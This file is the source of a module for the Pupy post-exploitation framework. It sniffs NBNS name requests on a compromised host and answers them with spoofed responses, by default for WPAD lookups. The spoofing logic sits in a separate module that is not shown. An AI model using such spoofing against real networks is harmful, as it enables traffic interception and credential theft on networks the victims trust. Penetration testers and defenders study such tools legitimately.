# -*- coding: UTF8 -*-
# Copyright (c) 2017, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
import sys
import subprocess
import threading
import Queue
import time
from modules.lib.windows.winpcap import init_winpcap
from pupylib import *

__class_name__="NbnsSpoofModule"

@config(cat="network", tags=["netbios", "NBNS", "spoof"])
class NbnsSpoofModule(PupyModule):
    """ sniff for NBNS requests and spoof NBNS responses """

    max_clients=1
    dependencies=['scapy', 'nbnsspoof']

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog='nbnsspoof.py', description=self.__doc__)
        self.arg_parser.add_argument("-i", "--iface", default=None, help="change default iface")
        self.arg_parser.add_argument("--timeout", type=int, default=300, help="stop the spoofing after N seconds (default 300)")
        self.arg_parser.add_argument("--regex", default=".*WPAD.*", help="only answer for requests matching the regex (default: .*WPAD.*)")
        self.arg_parser.add_argument("srcmac", help="source mac address to use for the responses")
        self.arg_parser.add_argument("ip", help="IP to spoof")


    def run(self, args):
        init_winpcap(self)

        with redirected_stdo(self.client.conn):
            self.client.conn.modules['nbnsspoof'].start_nbnsspoof(args.ip, args.srcmac, timeout=args.timeout, verbose=True, interface=args.iface, name_regexp=args.regex)

                




